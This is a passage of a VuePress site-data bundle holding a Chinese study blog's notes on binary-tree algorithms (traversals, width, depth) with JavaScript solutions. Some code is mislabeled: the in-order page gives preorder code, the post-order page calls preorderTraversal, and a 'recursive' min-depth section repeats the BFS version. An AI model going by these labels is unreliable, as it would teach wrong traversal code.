Coding",base:"/yang-blog/",headTags:[["link",{rel:"icon",href:"./public/"}]],pages:[{title:"二叉树的宽度",frontmatter:{title:"二叉树的宽度"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html",relativePath:"dataStructure/二叉树/二叉树的宽度.md",key:"v-8ec5a598",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html",headers:[{level:2,title:"二叉树的宽度",slug:"二叉树的宽度",normalizedTitle:"二叉树的宽度",charIndex:2},{level:2,title:"宽度遍历(队列)",slug:"宽度遍历-队列",normalizedTitle:"宽度遍历(队列)",charIndex:50},{level:2,title:"求最大宽度",slug:"求最大宽度",normalizedTitle:"求最大宽度",charIndex:506},{level:3,title:"思路",slug:"思路",normalizedTitle:"思路",charIndex:516},{level:3,title:"题目描述",slug:"题目描述",normalizedTitle:"题目描述",charIndex:538}],headersStr:"二叉树的宽度 宽度遍历(队列) 求最大宽度 思路 题目描述",content:"# 二叉树的宽度\n\n若某一层的节点数不少于其他层次的节点数,那么该节点数即为二叉树的宽度。\n\n\n# 宽度遍历(队列)\n\n  var widthOfBinaryTree = function(root) {\n    if(root === null) return\n    const result  = []\n    const queue = [] //定义空队列\n    queue.push(root)\n    while(queue.length){\n      let current = queue.shift() \n      result.push(current.val)\n      if(current.left!==null){\n        queue.push(current.left)\n      }\n      if(current.right!==null){\n        queue.push(current.right)\n      }\n    } \n    return result   \n  };\n  widthOfBinaryTree(tree)\n\n\n\n# 求最大宽度\n\n\n# 思路\n\n * 统计每一层的节点个数\n\n\n# 题目描述\n\n * Leetcode662 给定一个二叉树，编写一个函数来获取这个树的最大宽度。树的宽度是所有层中的最大宽度。这个二叉树与满二叉树（full binary tree）结构相同，但一些节点为空。 每一层的宽度被定义为两个端点（该层最左和最右的非空节点，两端点间的null节点也计入长度）之间的长度。\n\n * 非递归\n\nvar widthOfBinaryTree = function(root) {\n\n    if (!root) return 0;\n\n    //queue存储节点，numArr存储节点对应的节点编号位置\n    var queue = [root], numArr = [0], maxWidth = 1;\n\n    while (queue.length) {\n        //tempQueue存储每一层级所有的节点，tempNumArr存储对应节点的编号位置\n        var tempQueue = [], tempNumArr = [];\n        while (queue.length) {\n            var node = queue.shift(), num = numArr.shift(); //取出栈底节点和编号\n\n            if (node.left) {\n                tempQueue.push(node.left);\n                tempNumArr.push(num * 2 + 1);\n            }\n            if (node.right) {\n                tempQueue.push(node.right);\n                tempNumArr.push(num * 2 + 2);\n            }\n        }\n        var tempWidth = 0;\n        //计算tempNumArr中存储的这一层的宽度, 最后一位元素存储这一层级最大宽度的编号\n        if (tempNumArr.length) {\n            tempWidth = tempNumArr[tempNumArr.length - 1] - tempNumArr[0] + 1;\n        }\n        if (tempWidth > maxWidth) {\n            maxWidth = tempWidth;  //更新最大宽度\n        }\n\n        //开始下一个层级的宽度计算\n        queue = tempQueue;\n        numArr = tempNumArr;\n    }\n\n    return maxWidth;\n};\n\n\n * 递归\n\nvar widthOfBinaryTree2 = function(root) {\n\n    if (!root) return 0;\n\n    var res = [], maxWidth = 1;\n    recusion(root, 0, 0);\n    return maxWidth;\n\n    function recusion(root, level, num){\n\n        if (res[level]){\n            res[level].push(num);\n        }\n        else{\n            res[level] = [num];\n        }\n\n        //计算最大宽度\n        var tempArr = res[level];\n        var tempWidth = tempArr[tempArr.length - 1] - tempArr[0] + 1;\n        if (tempWidth > maxWidth) {\n            maxWidth = tempWidth;\n        }\n\n        if (root.left){\n            recusion(root.left, level + 1, num * 2 + 1);\n        }\n        if (root.right){\n            recusion(root.right, level + 1, num * 2 + 2);\n        }\n    }\n};\n",normalizedContent:"# 二叉树的宽度\n\n若某一层的节点数不少于其他层次的节点数,那么该节点数即为二叉树的宽度。\n\n\n# 宽度遍历(队列)\n\n  var widthofbinarytree = function(root) {\n    if(root === null) return\n    const result  = []\n    const queue = [] //定义空队列\n    queue.push(root)\n    while(queue.length){\n      let current = queue.shift() \n      result.push(current.val)\n      if(current.left!==null){\n        queue.push(current.left)\n      }\n      if(current.right!==null){\n        queue.push(current.right)\n      }\n    } \n    return result   \n  };\n  widthofbinarytree(tree)\n\n\n\n# 求最大宽度\n\n\n# 思路\n\n * 统计每一层的节点个数\n\n\n# 题目描述\n\n * leetcode662 给定一个二叉树，编写一个函数来获取这个树的最大宽度。树的宽度是所有层中的最大宽度。这个二叉树与满二叉树（full binary tree）结构相同，但一些节点为空。 每一层的宽度被定义为两个端点（该层最左和最右的非空节点，两端点间的null节点也计入长度）之间的长度。\n\n * 非递归\n\nvar widthofbinarytree = function(root) {\n\n    if (!root) return 0;\n\n    //queue存储节点，numarr存储节点对应的节点编号位置\n    var queue = [root], numarr = [0], maxwidth = 1;\n\n    while (queue.length) {\n        //tempqueue存储每一层级所有的节点，tempnumarr存储对应节点的编号位置\n        var tempqueue = [], tempnumarr = [];\n        while (queue.length) {\n            var node = queue.shift(), num = numarr.shift(); //取出栈底节点和编号\n\n            if (node.left) {\n                tempqueue.push(node.left);\n                tempnumarr.push(num * 2 + 1);\n            }\n            if (node.right) {\n                tempqueue.push(node.right);\n                tempnumarr.push(num * 2 + 2);\n            }\n        }\n        var tempwidth = 0;\n        //计算tempnumarr中存储的这一层的宽度, 最后一位元素存储这一层级最大宽度的编号\n        if (tempnumarr.length) {\n            tempwidth = tempnumarr[tempnumarr.length - 1] - tempnumarr[0] + 1;\n        }\n        if (tempwidth > maxwidth) {\n            maxwidth = tempwidth;  //更新最大宽度\n        }\n\n        //开始下一个层级的宽度计算\n        queue = tempqueue;\n        numarr = tempnumarr;\n    }\n\n    return maxwidth;\n};\n\n\n * 递归\n\nvar widthofbinarytree2 = function(root) {\n\n    if (!root) return 0;\n\n    var res = [], maxwidth = 1;\n    recusion(root, 0, 0);\n    return maxwidth;\n\n    function recusion(root, level, num){\n\n        if (res[level]){\n            res[level].push(num);\n        }\n        else{\n            res[level] = [num];\n        }\n\n        //计算最大宽度\n        var temparr = res[level];\n        var tempwidth = temparr[temparr.length - 1] - temparr[0] + 1;\n        if (tempwidth > maxwidth) {\n            maxwidth = tempwidth;\n        }\n\n        if (root.left){\n            recusion(root.left, level + 1, num * 2 + 1);\n        }\n        if (root.right){\n            recusion(root.right, level + 1, num * 2 + 2);\n        }\n    }\n};\n",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:null,actionText:"开始阅读",actionLink:"/guide/",features:[{title:"前端",details:"js,http,css,vue......"},{title:"Javascript",details:"一些coding,常见的手写"},{title:"数据结构(DataStructure)",details:"目测才刚开始....."}],footer:"MIT Licensed | Copyright © 2021-present Yang"},regularPath:"/",relativePath:"README.md",key:"v-335c11a2",path:"/",headersStr:null,content:"Keep Coding\n\nstay hungry stay humble\n\n\n\n",normalizedContent:"keep coding\n\nstay hungry stay humble\n\n\n\n",charsets:{}},{title:"中序遍历",frontmatter:{title:"中序遍历"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/二叉树/中序遍历.md",key:"v-4c65533e",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html",headers:[{level:3,title:"步骤",slug:"步骤",normalizedTitle:"步骤",charIndex:2},{level:3,title:"题目",slug:"题目",normalizedTitle:"题目",charIndex:22}],headersStr:"步骤 题目",content:'# 步骤\n\n * 中序遍历:左根右\n\n\n# 题目\n\n# LeeCode 144 题\n\nconst tree = {\n  val: "1",\n  left: {\n    val: "2",\n    left: { val: "4", left: null, right: null },\n    right: { val: "5", left: null, right: null },\n  },\n  right: {\n    val: "3",\n    left: { val: "6", left: null, right: null },\n    right: { val: "7", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现)\n\n * 每颗子树整棵树左边界全部进栈，\n * 依次弹出的过程中，push，并对弹出节点的右树重复如上操作\n\nvar preorderTraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    result.push(current.val);\n    current = current.right;\n  }\n  return result;\n};\npreorderTraversal(tree);\n',normalizedContent:'# 步骤\n\n * 中序遍历:左根右\n\n\n# 题目\n\n# leecode 144 题\n\nconst tree = {\n  val: "1",\n  left: {\n    val: "2",\n    left: { val: "4", left: null, right: null },\n    right: { val: "5", left: null, right: null },\n  },\n  right: {\n    val: "3",\n    left: { val: "6", left: null, right: null },\n    right: { val: "7", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现)\n\n * 每颗子树整棵树左边界全部进栈，\n * 依次弹出的过程中，push，并对弹出节点的右树重复如上操作\n\nvar preordertraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    result.push(current.val);\n    current = current.right;\n  }\n  return result;\n};\npreordertraversal(tree);\n',charsets:{cjk:!0}},{title:"后序遍历",frontmatter:{title:"后序遍历"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/二叉树/后序遍历.md",key:"v-b0942ea8",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html",headers:[{level:3,title:"步骤",slug:"步骤",normalizedTitle:"步骤",charIndex:2}],headersStr:"步骤",content:"# 步骤\n\n * 后序遍历(先序遍历):左右根\n\n递归\n\nvar postorderTraversal = function (root, array = []) {\n  if (root) {\n    postorderTraversal(root.left, array);\n    postorderTraversal(root.right, array);\n    array.push(root.val);\n  }\n  return array;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现）\n\n * 弹出栈，放入回收栈，\n * 先左再右进栈\n * 循环这个操作，push 回收站中的 val\n\nvar postorderTraversal = function (root) {\n  const result = [];\n  if (root !== null) {\n    const stack1 = [];\n    const stack2 = [];\n    stack1.push(root);\n    while (stack1.length) {\n      root = stack1.pop();\n      stack2.push(root);\n      if (root.left !== null) {\n        stack1.push(root.left);\n      }\n      if (root.right !== null) {\n        stack1.push(root.right);\n      }\n    }\n    while (stack2.length) {\n      result.push(stack2.pop().val);\n    }\n  }\n  return result;\n};\npostorderTraversal(tree);\n",normalizedContent:"# 步骤\n\n * 后序遍历(先序遍历):左右根\n\n递归\n\nvar postordertraversal = function (root, array = []) {\n  if (root) {\n    postordertraversal(root.left, array);\n    postordertraversal(root.right, array);\n    array.push(root.val);\n  }\n  return array;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现）\n\n * 弹出栈，放入回收栈，\n * 先左再右进栈\n * 循环这个操作，push 回收站中的 val\n\nvar postordertraversal = function (root) {\n  const result = [];\n  if (root !== null) {\n    const stack1 = [];\n    const stack2 = [];\n    stack1.push(root);\n    while (stack1.length) {\n      root = stack1.pop();\n      stack2.push(root);\n      if (root.left !== null) {\n        stack1.push(root.left);\n      }\n      if (root.right !== null) {\n        stack1.push(root.right);\n      }\n    }\n    while (stack2.length) {\n      result.push(stack2.pop().val);\n    }\n  }\n  return result;\n};\npostordertraversal(tree);\n",charsets:{cjk:!0}},{title:"数据结构",frontmatter:{title:"数据结构"},regularPath:"/dataStructure/",relativePath:"dataStructure/README.md",key:"v-5cf39b7b",path:"/dataStructure/",headers:[{level:2,title:"树简介",slug:"树简介",normalizedTitle:"树简介",charIndex:2},{level:2,title:"二叉树",slug:"二叉树",normalizedTitle:"二叉树",charIndex:17}],headersStr:"树简介 二叉树",content:"# 树简介\n\n * 简介\n\n\n# 二叉树\n\n * 前序遍历⭐⭐\n * 中序遍历⭐⭐\n * 后序遍历⭐⭐\n * 二叉树最大宽度\n * 重建二叉树\n * 最小最大深度\n * 层序遍历",normalizedContent:"# 树简介\n\n * 简介\n\n\n# 二叉树\n\n * 前序遍历⭐⭐\n * 中序遍历⭐⭐\n * 后序遍历⭐⭐\n * 二叉树最大宽度\n * 重建二叉树\n * 最小最大深度\n * 层序遍历",charsets:{cjk:!0}},{title:"层序遍历",frontmatter:{title:"层序遍历"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/二叉树/层序遍历.md",key:"v-0ac26bb5",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html",headers:[{level:3,title:"返回一维数组",slug:"返回一维数组",normalizedTitle:"返回一维数组",charIndex:32},{level:3,title:"返回二数组",slug:"返回二数组",normalizedTitle:"返回二数组",charIndex:514}],headersStr:"返回一维数组 返回二数组",content:" * 层序遍历：即逐层地，从左到右访问所有节点(队列)\n\n\n# 返回一维数组\n\n * 根节点入队，依次循环队中节点，将节点出队，并将子节点入队\n * 基于队先进先出的特点，根节点先入队，所以先出队进入res数组\n\nvar levelOrder = function (root) {\n    // 临界值\n    if (root == null) return [];\n    // 定义队列\n    const queue = [];\n    // 返回值\n    const res = [];\n    queue.push(root);\n    while (queue.length) {\n        const node = queue.shift();\n        // 左右节点不为空，入队继续遍历\n        if (node.left) queue.push(node.left);\n        if (node.right) queue.push(node.right);\n        res.push(node.val);\n    }\n    return res;\n};\n\n\n\n# 返回二数组\n\n * 相比于一维数组，多进行一层的遍历，当前层放置于一个数组中\n\nvar levelOrder = function (root) {\n    // 返回值约定好说返回二维数组，实际上为空树时还是得已[]返回?\n    if(root == null) return [];\n    const queue = [];\n    const res = [];\n    \n    queue.push(root);\n    while (queue.length) {\n        // 使用arr添加这一层的元素\n        const arr = [];\n        // 记录当前值的节点数量,后续操作出入队数量会变化\n        const n = queue.length;\n        for(let i = 0; i < n; i++){\n            const node = queue.shift();\n            arr.push(node.val);\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n        res.push(arr);\n    }\n    return res;\n};\n",normalizedContent:" * 层序遍历：即逐层地，从左到右访问所有节点(队列)\n\n\n# 返回一维数组\n\n * 根节点入队，依次循环队中节点，将节点出队，并将子节点入队\n * 基于队先进先出的特点，根节点先入队，所以先出队进入res数组\n\nvar levelorder = function (root) {\n    // 临界值\n    if (root == null) return [];\n    // 定义队列\n    const queue = [];\n    // 返回值\n    const res = [];\n    queue.push(root);\n    while (queue.length) {\n        const node = queue.shift();\n        // 左右节点不为空，入队继续遍历\n        if (node.left) queue.push(node.left);\n        if (node.right) queue.push(node.right);\n        res.push(node.val);\n    }\n    return res;\n};\n\n\n\n# 返回二数组\n\n * 相比于一维数组，多进行一层的遍历，当前层放置于一个数组中\n\nvar levelorder = function (root) {\n    // 返回值约定好说返回二维数组，实际上为空树时还是得已[]返回?\n    if(root == null) return [];\n    const queue = [];\n    const res = [];\n    \n    queue.push(root);\n    while (queue.length) {\n        // 使用arr添加这一层的元素\n        const arr = [];\n        // 记录当前值的节点数量,后续操作出入队数量会变化\n        const n = queue.length;\n        for(let i = 0; i < n; i++){\n            const node = queue.shift();\n            arr.push(node.val);\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n        res.push(arr);\n    }\n    return res;\n};\n",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/树简介/深度优先遍历.md",key:"v-fcb756ba",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"最大最小深度",frontmatter:{title:"最大最小深度"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html",relativePath:"dataStructure/二叉树/最小最大深度.md",key:"v-8f072a64",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html",headers:[{level:2,title:"最小深度",slug:"最小深度",normalizedTitle:"最小深度",charIndex:2},{level:3,title:"leetCode 111题",slug:"leetcode-111题",normalizedTitle:"leetcode 111题",charIndex:62},{level:2,title:"最大深度",slug:"最大深度",normalizedTitle:"最大深度",charIndex:188},{level:3,title:"leetCode 104题",slug:"leetcode-104题",normalizedTitle:"leetcode 104题",charIndex:931},{level:3,title:"bfs",slug:"bfs",normalizedTitle:"bfs",charIndex:1093}],headersStr:"最小深度 leetCode 111题 最大深度 leetCode 104题 bfs",content:"# 最小深度\n\n * 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。说明：叶子节点是指没有子节点的节点。\n\n\n# leetCode 111题\n\n# 队列\n\n * 1、根节点出发,当前节点及给定默认最小深度入队\n * 2、循环，根节点出队，如果当前节点既没有左子树，右子树，返回当前深度1\n * 3、左右节点分别入队列,深度+1\n * 4、周而复始,直至清空队列，返回最大深度\n\nvar minDepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n# 递归\n\n * 左右子树都不为空：左子树深度和右子树最小深度的最小值 + 1\n * 左树为空：右子树最小深度的最小值 + 1\n * 右树为空：左子树最小深度 + 1\n\n\n#\n\nvar minDepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n\n# 最大深度\n\n * 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数\n\n\n# leetCode 104题\n\n# 递归\n\nvar maxDepth = function (root) {\n    if (root == null) return 0;\n    return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;\n};\n\n\n\n# bfs\n\n * 每通过一层deep++\n\nvar maxDepth = function (root) {\n    if (root == null) return 0;\n    const queue = [];\n    let deep = 0;\n    queue.push(root);\n    while (queue.length) {\n        deep++;\n        const n = queue.length;\n        for (let i = 0; i < n; i++) {\n            const node = queue.shift();\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n    }\n    return deep;\n};\n",normalizedContent:"# 最小深度\n\n * 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。说明：叶子节点是指没有子节点的节点。\n\n\n# leetcode 111题\n\n# 队列\n\n * 1、根节点出发,当前节点及给定默认最小深度入队\n * 2、循环，根节点出队，如果当前节点既没有左子树，右子树，返回当前深度1\n * 3、左右节点分别入队列,深度+1\n * 4、周而复始,直至清空队列，返回最大深度\n\nvar mindepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n# 递归\n\n * 左右子树都不为空：左子树深度和右子树最小深度的最小值 + 1\n * 左树为空：右子树最小深度的最小值 + 1\n * 右树为空：左子树最小深度 + 1\n\n\n#\n\nvar mindepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n\n# 最大深度\n\n * 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数\n\n\n# leetcode 104题\n\n# 递归\n\nvar maxdepth = function (root) {\n    if (root == null) return 0;\n    return math.max(maxdepth(root.left), maxdepth(root.right)) + 1;\n};\n\n\n\n# bfs\n\n * 每通过一层deep++\n\nvar maxdepth = function (root) {\n    if (root == null) return 0;\n    const queue = [];\n    let deep = 0;\n    queue.push(root);\n    while (queue.length) {\n        deep++;\n        const n = queue.length;\n        for (let i = 0; i < n; i++) {\n            const node = queue.shift();\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n    }\n    return deep;\n};\n",charsets:{cjk:!0}},{title:"广度优先遍历",frontmatter:{title:"广度优先遍历"},regularPath:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/树简介/广度优先遍历.md",key:"v-654671c3",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",headersStr:null,content:"树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n",normalizedContent:"树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n",charsets:{cjk:!0}},{title:"前序遍历",frontmatter:{title:"前序遍历"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html",relativePath:"dataStructure/二叉树/前序遍历.md",key:"v-c8550c00",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html",headers:[{level:3,title:"步骤",slug:"步骤",normalizedTitle:"步骤",charIndex:97},{level:3,title:"题目",slug:"题目",normalizedTitle:"题目",charIndex:123}],headersStr:"步骤 题目",content:'左神课程链接-> 见 1:07:14 ☀️☀️☀️\n\n * 通过递归序实现，前序：在第一次经过自己时 push，中序：在第二次经过自己时 push，后序：在第三次经过自己时 push。\n\n\n# 步骤\n\n * 前序遍历(先序遍历):根左右\n\n\n# 题目\n\n# LeeCode 144 题\n\nconst tree = {\n  val: "1",\n  left: {\n    val: "2",\n    left: { val: "4", left: null, right: null },\n    right: { val: "5", left: null, right: null },\n  },\n  right: {\n    val: "3",\n    left: { val: "6", left: null, right: null },\n    right: { val: "7", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现）\n\n * 取根节点为目标节点，开始遍历\n * 1.左孩子入栈 -> 直至左孩子为空的节点\n * 2.栈顶节点的右节点为空或右节点被访问过 -> 节点出栈并访问他，将节点标记为已访问\n * 3.栈顶节点的右节点不为空且未被访问，以右孩子为目标节点，再依次执行 1、2、3\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  let result = [];\n  let stack = [root]; //定义栈\n  while (stack.length) {\n    //出栈\n    let o = stack.pop();\n    result.push(o.val);\n    //入栈\n    o.right && stack.push(o.right);\n    o.left && stack.push(o.left);\n  }\n  return result;\n};\npreorderTraversal(tree);\n//或者\nvar preorderTraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      result.push(current.val);\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    current = current.right;\n  }\n  return result;\n};\npreorderTraversal(tree);\n',normalizedContent:'左神课程链接-> 见 1:07:14 ☀️☀️☀️\n\n * 通过递归序实现，前序：在第一次经过自己时 push，中序：在第二次经过自己时 push，后序：在第三次经过自己时 push。\n\n\n# 步骤\n\n * 前序遍历(先序遍历):根左右\n\n\n# 题目\n\n# leecode 144 题\n\nconst tree = {\n  val: "1",\n  left: {\n    val: "2",\n    left: { val: "4", left: null, right: null },\n    right: { val: "5", left: null, right: null },\n  },\n  right: {\n    val: "3",\n    left: { val: "6", left: null, right: null },\n    right: { val: "7", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现）\n\n * 取根节点为目标节点，开始遍历\n * 1.左孩子入栈 -> 直至左孩子为空的节点\n * 2.栈顶节点的右节点为空或右节点被访问过 -> 节点出栈并访问他，将节点标记为已访问\n * 3.栈顶节点的右节点不为空且未被访问，以右孩子为目标节点，再依次执行 1、2、3\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  let result = [];\n  let stack = [root]; //定义栈\n  while (stack.length) {\n    //出栈\n    let o = stack.pop();\n    result.push(o.val);\n    //入栈\n    o.right && stack.push(o.right);\n    o.left && stack.push(o.left);\n  }\n  return result;\n};\npreordertraversal(tree);\n//或者\nvar preordertraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      result.push(current.val);\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    current = current.right;\n  }\n  return result;\n};\npreordertraversal(tree);\n',charsets:{cjk:!0}},{title:"简介",frontmatter:{title:"简介"},regularPath:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html",relativePath:"dataStructure/树简介/简介.md",key:"v-481f32c4",path:"/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E7%AE%80%E4%BB%8B.html",headers:[{level:3,title:"树",slug:"树",normalizedTitle:"树",charIndex:2},{level:3,title:"树结构",slug:"树结构",normalizedTitle:"树结构",charIndex:126}],headersStr:"树 树结构",content:'# 树\n\n树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n\n\n\n# 树结构\n\n * 多叉树： 例如：DOM 结构\n\n<div>\n  <span></span>\n  <span></span>\n  <span></span>\n  <span></span>\n</div>\n\n\n * 二叉树(最常见):\n\nconst tree = {\n  val: "a",\n  children: [\n    {\n      val: "b",\n      children: [\n        { val: "d", children: [] },\n        { val: "e", children: [] },\n      ],\n    },\n    {\n      val: "c",\n      children: [\n        { val: "f", children: [] },\n        { val: "g", children: [] },\n      ],\n    },\n  ],\n};\n',normalizedContent:'# 树\n\n树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n\n\n\n# 树结构\n\n * 多叉树： 例如：dom 结构\n\n<div>\n  <span></span>\n  <span></span>\n  <span></span>\n  <span></span>\n</div>\n\n\n * 二叉树(最常见):\n\nconst tree = {\n  val: "a",\n  children: [\n    {\n      val: "b",\n      children: [\n        { val: "d", children: [] },\n        { val: "e", children: [] },\n      ],\n    },\n    {\n      val: "c",\n      children: [\n        { val: "f", children: [] },\n        { val: "g", children: [] },\n      ],\n    },\n  ],\n};\n',charsets:{cjk:!0}},{title:"重建二叉树",frontmatter:{title:"重建二叉树"},regularPath:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",relativePath:"dataStructure/二叉树/重建二叉树.md",key:"v-da74fa72",path:"/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",headers:[{level:2,title:"题目",slug:"题目",normalizedTitle:"题目",charIndex:2},{level:3,title:"剑指 Offer 07",slug:"剑指-offer-07",normalizedTitle:"剑指 